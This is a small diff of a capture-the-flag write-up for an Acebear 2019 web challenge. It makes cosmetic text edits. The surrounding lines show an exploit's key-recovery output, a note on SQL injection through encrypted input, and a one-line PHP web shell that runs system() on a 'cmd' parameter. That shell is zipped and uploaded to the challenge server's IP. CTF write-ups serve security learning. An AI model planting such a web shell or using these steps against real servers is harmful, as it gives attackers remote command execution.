@@ -132,7 +132,7 @@ $ python exp.py
 m4ga9-r21kc,!@$!
 $
 ```
-> Now we got the Key ; We can send whatever we want by encrypting <br>
+> Now we got the Key ; We can send whatever we want by encrypting it <br>
 > The server decrypt's it and places it in sql query
 ### Checking the Injection
 ```
@@ -224,7 +224,7 @@ A json file with "type":"h4x0r","name":"anything"
 if(isset($_GET['cmd'])){ echo "<pre>"; $cmd = ($_GET['cmd']); system($cmd); echo "</pre>"; die; }
 ?>
 ```
-> zip those two files [evil.zip](https://github.com/D1r3Wolf/CTF-writeups/blob/master/Acebear-2019/duudududduduud/evil.zip) && upload it to server<br>
+* zip those two files [evil.zip](https://github.com/D1r3Wolf/CTF-writeups/blob/master/Acebear-2019/duudududduduud/evil.zip) && upload it to server<br>
 ![upload1](https://raw.githubusercontent.com/D1r3Wolf/CTF-writeups/master/Acebear-2019/duudududduduud/img/upload1.png)
 > It Provided a path uploads/a3d7ebbe913126890938bdfe90833490/<br>
 > Access them on http://54.169.92.223/uploads/a3d7ebbe913126890938bdfe90833490/ <br>
